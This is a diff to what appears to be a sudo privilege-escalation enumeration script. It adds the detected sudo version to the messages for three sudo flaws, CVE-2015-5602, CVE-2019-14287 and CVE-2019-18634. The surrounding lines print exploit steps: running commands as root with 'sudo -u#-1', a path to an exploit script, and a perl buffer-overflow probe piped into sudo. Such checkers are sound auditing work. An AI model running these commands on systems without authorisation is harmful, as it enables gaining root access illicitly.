@@ -396,7 +396,8 @@ sudodblwildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD: sudoedit" | g
 if [ "$sudodblwildcard" ]; then
   echo -e "${BOLD}${GREEN}[+] Sudoedit with double wildcard was detected (CVE-2015-5602): ${RESET}" 
   echo -e "$sudodblwildcard"
-  echo -e "[-] Vulnerable to CVE-2015-5602 if the sudo version is <=1.8.14"  
+  echo -e "[-] Vulnerable to CVE-2015-5602"
+  echo -e "[-] current version : {$sudover} | vuln version: <=1.8.14"  
   echo -e "[*] Exploit: /exploits/CVE-2015-5602.sh"  
   echo -e "\n" 
 #  echo -e "[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\n"  
@@ -409,7 +410,8 @@ sudorunas=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)")
 if [ "$sudorunas" ]; then
   cmdi=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)" | sed 's/NOPASSWD//g' | sed 's/://g' | cut -d ")" -f 2)
   echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-14287: ${RESET}"
-  echo -e "[-] Vulnerable to CVE-2019-14287 if the sudo version is <=1.8.27"
+  echo -e "[-] Vulnerable to CVE-2019-14287"
+  echo -e "[-] current version : {$sudover} | vuln version: <=1.8.27"
   echo -e "[-] Example : sudo -u#-1 /usr/bin/id"  
   echo -e "[-] Run command : sudo -u#-1 <cmd>"
   echo -e "[-] where <cmd> is one of the following:"
@@ -424,7 +426,8 @@ if [ "$cnver" -lt "1008026" ] && [ "$cnver" -gt "1007001" ] ; then
 sudopwfeedback=$(echo "$cmd" 2>/dev/null | grep " pwfeedback")
 if [ "$sudopwfeedback" ]; then
   echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-18634: ${RESET}"
-  echo -e "[-] Vulnerable to CVE-2019-18634 if the sudo version is 1.7.1 to 1.8.25p1 inclusive"
+  echo -e "[-] Vulnerable to CVE-2019-18634" 
+  echo -e "[-] current version : {$sudover} | vuln version: 1.7.1 to 1.8.25p1 inclusive"
 # echo -e "[-] Run command : perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id"
   echo -e "[-] Run command : perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id"
   echo -e "[-] if you have a segmentation fault then sudo is vulnerable"
